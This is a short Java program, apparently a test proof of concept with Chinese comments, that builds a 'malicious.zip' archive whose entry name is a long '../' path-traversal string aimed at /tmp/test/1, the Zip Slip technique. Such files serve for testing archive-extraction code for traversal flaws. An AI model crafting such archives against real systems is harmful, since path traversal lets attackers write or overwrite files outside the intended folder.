package com.test;

import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class MaliciousZipFileCreator {

    public static void main(String[] args) {
        // 恶意文件路径，攻击者试图遍历到根目录
        String maliciousFilePath = "../../../../../../../../../../../../../../../../../../tmp/test/1";

        // 希望创建的恶意Zip文件名
        String maliciousZipFileName = "malicious.zip";

        try {
            // 创建Zip输出流
            ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(maliciousZipFileName));

            // 创建ZipEntry并设置文件名为恶意路径
            ZipEntry zipEntry = new ZipEntry(maliciousFilePath);

            // 将恶意ZipEntry添加到Zip文件中
            zipOutputStream.putNextEntry(zipEntry);

            // 写入恶意内容（这里可以为空）
            byte[] maliciousContent = "This is a malicious file content.".getBytes();
            zipOutputStream.write(maliciousContent);

            // 关闭Zip输出流
            zipOutputStream.close();

            System.out.println("恶意Zip文件已创建：" + maliciousZipFileName);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
